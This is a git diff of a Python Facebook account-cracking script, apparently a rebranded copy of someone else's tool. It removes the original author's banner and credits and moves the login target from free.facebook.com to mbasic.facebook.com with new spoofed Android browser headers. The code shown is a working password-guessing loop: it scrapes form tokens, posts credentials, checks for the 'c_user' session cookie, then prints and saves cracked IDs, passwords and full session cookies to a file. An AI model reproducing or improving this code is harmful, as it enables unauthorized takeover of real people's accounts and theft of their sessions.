@@ -194,22 +194,7 @@ def uaku():
 #------------[ INDICATION ]---------------#
 
 logo =       ("""       
-oooooooooo      o88            oooo                              
- 888    888   o8888 oooo   oooo 888  ooooo ooooooo     ooooooo   
- 888oooo88  o88 888  888   888  888o888  888     888 888     888 
- 888  88o o888oo888oo 888 888   8888 88o 888     888 888     888 
-o888o  88o8    o888o    8888   o888o o888o 88ooo88     88ooo88   
-                     o8o888                                      
-
-\033[1;37m\033[1;31m    >>    Baxer Bet Bo Toole R4ykoo13     <<    
-\033[1;97m===============================================================
-\033[1;35m[-] AUTHOR    :\033[1;32m R4ykoo13 
-\033[1;35m[-] NRXE TOOL :\033[1;32m vip
-\033[1;35m[-] TOOLS     :\033[1;32m CRACK FAECBOOK 
-\033[1;35m[-] VERSION   :\033[1;32m V.3
-\033[1;35m[-] STATUS    :\033[1;32m R4ykoo13 
-\033[1;35m[-] CHANAL    :\033[1;32m R4ykoo_cracker
-\033[1;97m===============================================================""")
+""")
     
 # APK CHECK
 
@@ -307,9 +292,9 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mR4ykoo13\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mRaWa\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -320,32 +305,36 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'path': '/',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '980',
+}
+
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[R4ykoo13-OK] {cid} | {ps}")
+                print(f"\033[38;5;46m[RaWa-OK] {cid} | {ps}")
                 print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m][👉] :\033[1;92m {coki}")
                 #print(f'{B}User Agent--> {pro} \n')
                 open('/sdcard/TANYA-OK.txt', 'a').write( cid+' | '+ps+'\n')
